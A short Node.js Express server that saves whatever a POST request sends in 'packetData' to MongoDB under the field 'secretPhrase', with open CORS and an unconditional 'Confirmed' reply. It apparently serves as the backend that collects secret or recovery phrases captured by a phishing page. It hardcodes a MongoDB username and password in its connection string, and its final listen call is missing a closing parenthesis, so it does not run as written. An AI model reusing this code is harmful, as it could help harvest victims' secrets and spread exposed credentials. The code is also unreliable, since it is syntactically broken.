const express = require("express");
const server = express();
const cors = require("cors")
const bodyParser = require("body-parser")
const mongoose = require("mongoose");
const mongooseUrl = "mongodb+srv://dbBackend:clientbackend@cluster0.ycmie7z.mongodb.net/ClientBackend"

//Connect MONGO DB
async function mongooseConnect(){
    try{
        await mongoose.connect(mongooseUrl);
        console.log("Connected DB");
    }
    catch{
        console.log("Error DB")
    }
}
mongooseConnect()

//Schema
const schema = new mongoose.Schema({secretPhrase: {type:String}});
const schemaUse = mongoose.model('database1', schema);

//MiddleWares
server.use(cors());
server.use(bodyParser.json());

//API's
server.get("/",(req,res)=>{
    res.send("Hello World");
})

server.post("/",(req,res)=>{
    async function saveSchema(){
        let data = new schemaUse({
            secretPhrase:req.body.packetData
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO SAVE")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

//Server Listening
server.listen(8000 , ()=>{
    console.log("Server On");
}
;
